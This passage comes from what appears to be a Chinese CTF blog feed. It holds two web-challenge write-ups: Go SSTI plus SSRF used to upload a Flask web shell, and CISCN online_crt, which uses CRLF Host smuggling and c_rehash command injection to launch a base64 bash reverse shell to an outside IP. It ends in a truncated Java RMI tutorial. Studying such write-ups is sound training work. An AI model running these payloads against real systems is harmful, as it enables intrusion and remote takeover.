sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">		err = session.Save(c.Request, c.Writer)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个路由主要是设置session，如果name为空设置为guest。我第一言就感觉是session伪造，都思考起有什么漏洞可以从环境变量中得到SESSION_KEY了，结果看一下wp发现key是空的。感觉这个地方出的有点不好，我们将源码中的guest改成admin再在本地运行，由于key是空所有在本地得到的admin的session和题目admin的session一样。得到admin的session我们就可以访问/admin路由了我们看一下其他路由的代码</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">	xssWaf := html.EscapeString(name)</span><br><span class="line">	tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们看admin函数会发现<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br></pre></td></tr></table></figure><br>可以发现其直接将pongo2.FromString解析出的对象c输出到了模板中那么就存在ssti注入<br>我们再看一下flask路由<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">	body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br></pre></td></tr></table></figure><br>可以看出来存在ssrf会将传值的name和<code>http://127.0.0.1:5000/</code>拼接访问内网资产。我们先查看flask路由指向的内网网站是什么<br><br>我们可以发现其返回了127.0.0.1:5000的源码我们使用html文件来查看<br></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>会发现报错使得程序的源码和路径泄露了。并且我们可以看到其开启了debug，即我们修改了源码网页也会快速更新，那么我们就可以尝试使用admin界面的ssti来执行文件上传函数，来上传一个shell覆盖这个文件，使得我们可以进行命令执行。</p>
<h2 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h2><p>我们会发现导入了gin包那么我们就可以使用gin包的函数。</p>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">c.SaveUploadedFile(file *multipart.FileHeader, dst <span class="type">string</span>)</span><br><span class="line"><span class="comment">//file：multipart.FileHeader 类型的指针，代表上传文件的文件头信息，可以通过 c.FormFile(&quot;file&quot;) 获取。[这个file其实就是form表单中的name属性的值]</span></span><br><span class="line"><span class="comment">//dst：字符串类型，代表文件保存的目标路径。</span></span><br><span class="line">c.Request<span class="comment">//获取http的信息可以使用如下格式来获取请求头的内容</span></span><br><span class="line">c.Request.Referer<span class="comment">//像这样就可以得到Referer的内容</span></span><br></pre></td></tr></table></figure>
<p>正常我们执行文件上传的ssti的payload应该是下面这个<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">c.SaveUploadedFile(c.FormFile(<span class="string">&#x27;file&#x27;</span>),<span class="string">&quot;/app/server.py&quot;</span>)</span><br></pre></td></tr></table></figure><br>但是由于改题目有如下的过滤导致其特殊字符被编码使得无法进行ssti<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">html.EscapeString(name)</span><br></pre></td></tr></table></figure><br>这时候我们可以尝试使用c.Request来代替需要用到特殊符号的字符,以此来绕过waf<br>那么payload就如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.Referer())&#125;&#125;</span><br></pre></td></tr></table></figure><br>接下来就只要构建一个文件上传的form表单进行文件上传即可<br>exp<br><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.Referer())&#125;&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node5.anna.nssctf.cn:28535</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>/app/server.py</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>522</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryuMHzDNELmEQClC8i</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>file</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session-name=MTcxMzMyMjg4M3xEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXy1hS6mhHShqW9AhRhAbwm8TPUeR5aus6EAENV_jfwn1w==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryuMHzDNELmEQClC8i</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;py.py&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/x-python</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="language-pgsql">app = Flask(__name__)</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">@app.route(<span class="string">&#x27;/&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql">def <span class="keyword">index</span>():</span></span><br><span class="line"><span class="language-pgsql">    <span class="type">name</span> = request.args[<span class="string">&#x27;name&#x27;</span>]</span></span><br><span class="line"><span class="language-pgsql">    <span class="keyword">return</span> os.popen(<span class="type">name</span>).<span class="keyword">read</span>()</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">if</span> __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="language-pgsql">    app.run(host=&quot;0.0.0.0&quot;, port=<span class="number">5000</span>, <span class="keyword">debug</span>=<span class="keyword">True</span>)</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryuMHzDNELmEQClC8i</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">鎻愪氦</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryuMHzDNELmEQClC8i--</span></span></span><br></pre></td></tr></table></figure><br>将UA头和Referer的内容分别进行替换即可成功上传文件内容<br>之后就命令执行了,环境变量里存在flag<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:28956/flask?name=%3fname=env</span><br></pre></td></tr></table></figure></p>
<h1 id="CISCN-2022-初赛-online-crt"><a href="#CISCN-2022-初赛-online-crt" class="headerlink" title="[CISCN 2022 初赛]online_crt"></a>[CISCN 2022 初赛]online_crt</h1><p>这道题目我们打开是一个证书打印的网站.我们先查看源码<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_crt</span>(<span class="params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):</span><br><span class="line">    root_key = rsa.generate_private_key(</span><br><span class="line">        public_exponent=<span class="number">65537</span>,</span><br><span class="line">        key_size=<span class="number">2048</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    subject = issuer = x509.Name([</span><br><span class="line">        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),</span><br><span class="line">        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),</span><br><span class="line">        x509.NameAttribute(NameOID.LOCALITY_NAME, City),</span><br><span class="line">        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),</span><br><span class="line">        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),</span><br><span class="line">        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),</span><br><span class="line">    ])</span><br><span class="line">    root_cert = x509.CertificateBuilder().subject_name(</span><br><span class="line">        subject</span><br><span class="line">    ).issuer_name(</span><br><span class="line">        issuer</span><br><span class="line">    ).public_key(</span><br><span class="line">        root_key.public_key()</span><br><span class="line">    ).serial_number(</span><br><span class="line">        x509.random_serial_number()</span><br><span class="line">    ).not_valid_before(</span><br><span class="line">        datetime.datetime.utcnow()</span><br><span class="line">    ).not_valid_after(</span><br><span class="line">        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">3650</span>)</span><br><span class="line">    ).sign(root_key, hashes.SHA256(), default_backend())</span><br><span class="line">    crt_name = <span class="string">&quot;static/crt/&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;.crt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(crt_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(root_cert.public_bytes(serialization.Encoding.PEM))</span><br><span class="line">    <span class="keyword">return</span> crt_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getcrt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    Country = request.form.get(<span class="string">&quot;Country&quot;</span>, <span class="string">&quot;CN&quot;</span>)</span><br><span class="line">    Province = request.form.get(<span class="string">&quot;Province&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    City = request.form.get(<span class="string">&quot;City&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    OrganizationalName = request.form.get(<span class="string">&quot;OrganizationalName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    CommonName = request.form.get(<span class="string">&quot;CommonName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    EmailAddress = request.form.get(<span class="string">&quot;EmailAddress&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/createlink&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    json_data = &#123;<span class="string">&quot;info&quot;</span>: os.popen(<span class="string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(json_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    uri = request.form.get(<span class="string">&quot;uri&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8887</span>))</span><br><span class="line">    msg = <span class="string">f&#x27;&#x27;&#x27;GET <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: test_api_host</span></span><br><span class="line"><span class="string">User-Agent: Guest</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    client.send(msg.encode())</span><br><span class="line">    data = client.recv(<span class="number">2048</span>)</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>我们先查看器定义的几个路由.<br>/getcrt这个路由是用于创建一个证书的路由<br>/createlink 这个路由运用了c_rehash命令<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">os.popen(<span class="string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()</span><br></pre></td></tr></table></figure><br>这个popen函数给人一种可以命令执行的样子.但是没有参数的入口唯一可看的就是证书的名字.我们查一下c_rehash会发现其存在漏洞<br><a href="https://xz.aliyun.com/t/11703?time__1311=mqmx0DBDc737qx0vo4%2BxCTPQqGK6oO7irTD&amp;alichlgref=https%3A%2F%2Fwww.nssctf.cn%2F">CVE-2022-1292的分析</a><br>查看文章会发现当执行这个命令时如果证书文件名中包含<code>`会进行命令执行.那么我们只要能找到方法修改文件名即可进行命令执行.
我们看道最后一个路由发现其可以访问内网.
我们看一下内网的go语言源码
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	staticPath := <span class="string">&quot;/app/static/crt/&quot;</span></span><br><span class="line">	oldname := c.DefaultQuery(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	newname := c.DefaultQuery(<span class="string">&quot;newname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> oldname == <span class="string">&quot;&quot;</span> || newname == <span class="string">&quot;&quot;</span> || strings.Contains(oldname, <span class="string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">		c.String(<span class="number">500</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.String(<span class="number">200</span>, newname)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	router := gin.Default()</span><br><span class="line">	router.GET(<span class="string">&quot;/&quot;</span>, index)</span><br><span class="line">	router.GET(<span class="string">&quot;/admin/rename&quot;</span>, admin)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := router.Run(<span class="string">&quot;:8887&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
我们发现其/admin/rename路由是文件名修改的路由，那么思路一下子就清晰了。
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	staticPath := <span class="string">&quot;/app/static/crt/&quot;</span></span><br><span class="line">	oldname := c.DefaultQuery(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	newname := c.DefaultQuery(<span class="string">&quot;newname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> oldname == <span class="string">&quot;&quot;</span> || newname == <span class="string">&quot;&quot;</span> || strings.Contains(oldname, <span class="string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">		c.String(<span class="number">500</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.String(<span class="number">200</span>, newname)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
但是我们会看到想要修改文件的名字需要先绕过这两个
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> </span><br></pre></td></tr></table></figure>
首先是前一个，其是获取原始的url在官方文档里写了，当请求的url路径中存在url字符时会获取到url，但是不含有url字符时就有可能获取到空。即我们可以通过将其中一个/两层url编码使其传到后端时被一次urldecode后仍然为url编码字符。
而第二个我们可以将报文当成参数传入。
如在http报文中换行符为</code>\r\n`那么我们将其url编码后传入后就会被解析为换行符<br>我先举个http报文的例子<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /proxy HTTP/1.1\r\nHost: node4.anna.nssctf.cn:28745</span><br><span class="line">等于</span><br><span class="line">GET /proxy HTTP/1.1</span><br><span class="line">Host: node4.anna.nssctf.cn:28745</span><br></pre></td></tr></table></figure><br>那么我们就可以通过构造uri来使的Host被获取为admin代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uri=xxxxxxx%20HTTP/1.1%0D%0AHost:admin%0D%0A%0D%0A</span><br></pre></td></tr></table></figure><br>末尾需要两个换行符才可以请求成功。这是http的报文格式要求的，我们可以在bp里查看换行符的位置来了解<br>既然绕过了我们就开始尝试构造执行的命令<br>第一思路自然是弹个shell了。由于没有过滤我就直接尝试使用bash反弹代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newname=`echo c2ggLWkgPiYgL2Rldi90Y3AvMTExLjIzMC4zOC4xNTkvNzc3NyAwPiYx|base64 --decode|bash`.crt</span><br></pre></td></tr></table></figure><br>但是这个是我们要进行二次传参的参数，由于空格这种分隔符在get传值的时候必须进行url编码所以我们需要对参数空格进行二次编码，不然会报错<br>将上面的几种整合在一起，并将特殊字符进行一次url编码得到下面的内容,当然其实只要将&amp;空格换行符这种特殊的分隔符进行urldecode就可以了。在会进行二次传参的地方进行两次url编码，即可。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uri=/admin%252Frename%3Foldname%3D53753e06-b537-4d1e-af1f-6225747dd3ae.crt%26newname=%60echo%2520c2ggLWkgPiYgL2Rldi90Y3AvMTExLjIzMC4zOC4xNTkvNzc3NyAwPiYx%7Cbase64%2520--decode%7Cbash%60.crt%20HTTP/1.1%0D%0AHost:admin%0D%0A%0D%0A</span><br></pre></td></tr></table></figure><br>由于代码获取uri的获取form的uri即在post传参的uri但是由于这个路由只能处理GET传参所以我们需要将报文中的POST改为GET<br></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>刷题</category>
        <category>NSS</category>
      </categories>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI</title>
    <url>/2024/09/07/RMI/</url>
    <content><![CDATA[<h1 id="原本是打算在放假的使用学java的但是java内容太复杂了还有我太懒了，放假颓废了一个暑假，这才一直到开学才幡然醒悟，但是该说不说在上课的时候来学Java效率比在家里高多了嘿嘿"><a href="#原本是打算在放假的使用学java的但是java内容太复杂了还有我太懒了，放假颓废了一个暑假，这才一直到开学才幡然醒悟，但是该说不说在上课的时候来学Java效率比在家里高多了嘿嘿" class="headerlink" title="原本是打算在放假的使用学java的但是java内容太复杂了还有我太懒了，放假颓废了一个暑假，这才一直到开学才幡然醒悟，但是该说不说在上课的时候来学Java效率比在家里高多了嘿嘿"></a>原本是打算在放假的使用学java的但是java内容太复杂了还有我太懒了，放假颓废了一个暑假，这才一直到开学才幡然醒悟，但是该说不说在上课的时候来学Java效率比在家里高多了嘿嘿</h1><h1 id="本问学习与p牛的java安全漫谈与GitHub上的项目javasec"><a href="#本问学习与p牛的java安全漫谈与GitHub上的项目javasec" class="headerlink" title="本问学习与p牛的java安全漫谈与GitHub上的项目javasec"></a>本问学习与p牛的java安全漫谈与GitHub上的项目javasec</h1><h1 id="什么是RMI"><a href="#什么是RMI" class="headerlink" title="什么是RMI"></a>什么是RMI</h1><p>所谓的RMI其实是java的一种远程导入库的一种方式,其是由Registry,Sever 还有Client组成<br><img src="/2024/09/07/RMI/2.png" class="" title="alt text"><br><img src="/2024/09/07/RMI/3.png" class="" title="alt text"><br>通过图我们也可以看出来其交互过程为,Server创建远程对象而后组成Regisry,Client通过Regisry来查询自己要获取的对象。而后Regitry来放回远程调用对象的存根，而后stub与skeleton进行交互，而skeleton与远程对象进行交互</p>
<p>但是经过查阅java早在Java 2 SDK 1.2是就已经不使用skeleton了，而stub也不需要用户手动定义，所以真正的交互应该是stub和远程对象进行交互。</p>
<p>RMI的服务的分为接口，远程对象和注册表<br>我们使用代码来对RMI进行理解<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口-&gt;RMIHello.java</span></span><br><span class="line"><span class="keyword">package</span> org.LSE;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">(String c)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实现接口-&gt;Server.java</span></span><br><span class="line"><span class="keyword">package</span> org.LSE;</span><br><span class="line"><span class="keyword">import</span> java.rmi.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="comment">//创建远程对象类的接口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LSEHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIHello</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">LSEHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();<span class="comment">//调用UnicastRemoteObject的构造函数</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">(String c)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span 